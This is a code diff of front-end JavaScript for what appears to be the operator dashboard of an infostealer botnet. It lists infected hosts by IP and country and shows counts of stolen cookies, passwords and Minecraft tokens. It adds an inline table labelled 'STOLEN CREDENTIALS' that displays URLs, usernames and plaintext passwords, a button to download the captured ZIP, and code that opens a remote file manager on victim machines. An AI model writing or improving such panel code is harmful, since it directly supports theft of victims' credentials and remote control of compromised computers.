@@ -160,7 +160,7 @@ async function loadHosts() {
   if (d.rows.length === 0) {
     host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><line x1="6" x2="6.01" y1="6" y2="6"/><line x1="6" x2="6.01" y1="18" y2="18"/></svg>no hosts</div>';
   } else {
-    d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
+    d.rows.forEach(c => host.appendChild(buildRow(c)));
   }
 
   const page = Math.floor(s.offset / HOST_PAGE_SIZE) + 1;
@@ -170,125 +170,110 @@ async function loadHosts() {
   $('h-next').disabled = s.offset + HOST_PAGE_SIZE >= d.total;
 }
 
-function buildRow(c, onOpen) {
-  const el = document.createElement('div');
-  el.className = 'row';
-  el.innerHTML = `
+function buildRow(c) {
+  const wrapper = document.createElement('div');
+  wrapper.className = 'host-wrapper';
+
+  const row = document.createElement('div');
+  row.className = 'row';
+  row.style.cursor = 'pointer';
+  row.innerHTML = `
     <span class="dot ${c.online ? 'on' : 'off'}"></span>
     <span class="host">${esc(c.hostname)}</span>
     <span class="ip">${esc(c.ip)}</span>
     ${countryCell(c.country)}
     <span class="seen">${fmtAgo(c.lastSeen)}</span>
     <span class="actions"><button class="ghost mini" data-open>view</button></span>`;
-  el.addEventListener('click', (e) => {
-    if (!e.target.closest('button') || e.target.closest('[data-open]')) onOpen();
+
+  const details = document.createElement('div');
+  details.className = 'host-details';
+
+  row.addEventListener('click', async (e) => {
+    if (e.target.closest('button') && !e.target.closest('[data-open]')) return;
+    
+    const isOpen = details.classList.contains('open');
+    if (isOpen) {
+      details.classList.remove('open');
+      row.querySelector('[data-open]').textContent = 'view';
+    } else {
+      details.innerHTML = '<div class="note" style="padding:20px;">loading captures…</div>';
+      details.classList.add('open');
+      row.querySelector('[data-open]').textContent = 'hide';
+      await loadInlineUploads(c.id, details);
+    }
   });
-  return el;
+
+  wrapper.appendChild(row);
+  wrapper.appendChild(details);
+  return wrapper;
 }
 
-async function openHostDetail(c) {
-  $('drawer-title').textContent = `${c.hostname} — ${c.ip}`;
-  const box = $('drawer-content');
-  
-  const head = document.querySelector('.drawer-head');
-  let actionsDiv = head.querySelector('.drawer-actions');
-  if (!actionsDiv) {
-    actionsDiv = document.createElement('div');
-    actionsDiv.className = 'drawer-actions';
-    actionsDiv.style.cssText = 'display:flex; gap:8px; margin-left: auto; margin-right: 16px;';
-    head.insertBefore(actionsDiv, head.querySelector('.close-btn'));
-  }
-  actionsDiv.innerHTML = `
-    <button class="ghost mini" data-action="files">files</button>
-    <button class="ghost mini" data-action="procs">procs</button>
-    <button class="ghost mini" data-action="remote">remote</button>
-  `;
-  
-  head.querySelector('[data-action="files"]').onclick = () => openFileManager(c);
-  head.querySelector('[data-action="procs"]').onclick = () => openProcs(c);
-  head.querySelector('[data-action="remote"]').onclick = () => {
-    closeDrawer();
-    document.querySelector('.nav a[data-tab="remote"]')?.click();
-    state.remote.q = c.hostname;
-    $('r-search').value = c.hostname;
-    loadRemote();
-  };
-
-  box.innerHTML = `
-    <div class="drawer-stats" id="drawer-stats">
-       <div class="note">loading…</div>
-    </div>
-    <div class="drawer-captures" id="drawer-captures">
-       <div class="note">loading…</div>
-    </div>
-  `;
-
-  $('drawer').classList.add('open');
-  $('drawer-backdrop').classList.add('open');
-
-  await loadUploads(c.id, box.querySelector('#drawer-stats'), box.querySelector('#drawer-captures'));
-}
-
-async function loadUploads(clientId, statsContainer, capturesContainer) {
+async function loadInlineUploads(clientId, container) {
   const r = await fetch(`/api/clients/${clientId}/uploads`);
-  if (!r.ok) { statsContainer.innerHTML = '<div class="note">failed to load</div>'; return; }
+  if (!r.ok) { container.innerHTML = '<div class="note" style="padding:20px;">failed to load</div>'; return; }
   const rows = await r.json();
   
   if (rows.length === 0) {
-    statsContainer.innerHTML = '<div class="note">no captures yet.</div>';
-    capturesContainer.innerHTML = '';
+    container.innerHTML = '<div class="note" style="padding:20px;">no captures yet.</div>';
     return;
   }
 
   const latest = rows[0];
-  
-  if (latest && latest.stats) {
-      const s = latest.stats;
-      statsContainer.innerHTML = `
-        <div class="tile">
-            <div class="k" style="color:var(--green)">Netscape Cookies</div>
-            <div class="v" style="color:var(--green)">${s.netscapeCookies}</div>
-        </div>
-        <div class="tile">
-            <div class="k" style="color:var(--green)">JSON Cookies</div>
-            <div class="v" style="color:var(--green)">${s.jsonCookies}</div>
-        </div>
-        <div class="tile">
-            <div class="k" style="color:var(--red)">Passwords</div>
-            <div class="v" style="color:var(--red)">${s.passwords}</div>
-        </div>
-      `;
-      
-      let capturesHtml = '';
-      rows.forEach((u, index) => {
-          const uStats = u.stats || { netscapeCookies: 0, jsonCookies: 0, passwords: 0, passwordFiles: [], cookieFiles: [] };
-          
-          capturesHtml += `
-            <div class="capture-card" id="cap-${index}">
-                <div class="capture-header" onclick="document.getElementById('cap-${index}').classList.toggle('open')">
-                    <div>
-                        <span style="font-weight:600; color:var(--text);">${esc(u.filename)}</span>
-                        <span style="color:var(--muted); font-size:12px; margin-left:10px;">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</span>
-                    </div>
-                    <div style="display:flex; align-items:center; gap:10px;">
-                        <span class="priv-badge" style="background:var(--bg); color:var(--text); border:1px solid var(--line-2);">${uStats.netscapeCookies + uStats.jsonCookies} cookies · ${uStats.passwords} pws</span>
-                        <button class="ghost mini" onclick="event.stopPropagation(); location.href='/api/uploads/${u.id}/download'">↓</button>
-                    </div>
-                </div>
-                <div class="capture-body">
-                    <div style="font-size:11px; margin-bottom:8px; font-weight:600; color:var(--muted);">COOKIE FILES</div>
-                    ${uStats.cookieFiles.length ? uStats.cookieFiles.map(f => `<div style="font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:4px;">${esc(f.name)} — ${f.count} items (${f.type})</div>`).join('') : '<div class="note">None</div>'}
-                    
-                    <div style="font-size:11px; margin:12px 0 8px; font-weight:600; color:var(--muted);">PASSWORD FILES</div>
-                    ${uStats.passwordFiles.length ? uStats.passwordFiles.map(f => `<div style="font-family:var(--mono); font-size:12px; color:var(--text); margin-bottom:4px;">${esc(f.name)} — ${f.count} items</div>`).join('') : '<div class="note">None</div>'}
-                </div>
-            </div>
-          `;
-      });
-      capturesContainer.innerHTML = capturesHtml;
+  const s = latest.stats || { netscapeCookies: 0, jsonCookies: 0, passwords: 0, mcTokens: 0, discordTokens: 0, creds: [] };
+  const totalCookies = s.netscapeCookies + s.jsonCookies;
+
+  let html = `
+    <div class="detail-grid">
+      <div class="detail-tile">
+        <div class="k" style="color:var(--green)">Cookies</div>
+        <div class="v">${totalCookies}</div>
+      </div>
+      <div class="detail-tile">
+        <div class="k" style="color:var(--red)">Passwords</div>
+        <div class="v">${s.passwords}</div>
+      </div>
+      <div class="detail-tile">
+        <div class="k" style="color:var(--accent)">Minecraft Tokens</div>
+        <div class="v">${s.mcTokens}</div>
+      </div>
+    </div>
+  `;
+
+  if (s.creds && s.creds.length > 0) {
+    html += `
+      <div class="k" style="font-size:11px; margin-bottom:8px; color:var(--muted); font-weight:600;">STOLEN CREDENTIALS</div>
+      <div class="pass-table-wrap">
+        <table class="pass-table">
+          <thead>
+            <tr>
+              <th style="width:40%">URL</th>
+              <th style="width:30%">Username</th>
+              <th style="width:30%">Password</th>
+            </tr>
+          </thead>
+          <tbody>
+            ${s.creds.map(c => `
+              <tr>
+                <td>${esc(c.url)}</td>
+                <td>${esc(c.user)}</td>
+                <td style="color:var(--green)">${esc(c.pass)}</td>
+              </tr>
+            `).join('')}
+          </tbody>
+        </table>
+      </div>
+    `;
   } else {
-      capturesContainer.innerHTML = '<div class="note">no stats available for these captures.</div>';
+    html += `<div class="note">No plaintext passwords found in this capture.</div>`;
   }
+
+  html += `
+    <div style="display:flex; justify-content:flex-end; margin-top:16px;">
+      <button class="primary mini" onclick="event.stopPropagation(); location.href='/api/uploads/${latest.id}/download'">Download ZIP</button>
+    </div>
+  `;
+
+  container.innerHTML = html;
 }
 
 // ---------- REMOTE OPENER ----------
@@ -341,17 +326,7 @@ async function openFileManager(c) {
   if (!info || !info.ip) return alert('Remote server IP not found from Solana');
   const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', token: info.token });
   window.open(`http://${info.ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
-  closeDrawer();
 }
-
-function closeDrawer() {
-  $('drawer').classList.remove('open');
-  $('drawer-backdrop').classList.remove('open');
-}
-
-$('drawer-close').addEventListener('click', closeDrawer);
-$('drawer-backdrop').addEventListener('click', closeDrawer);
-document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
 
 async function loadRemote() {
   const s = state.remote;
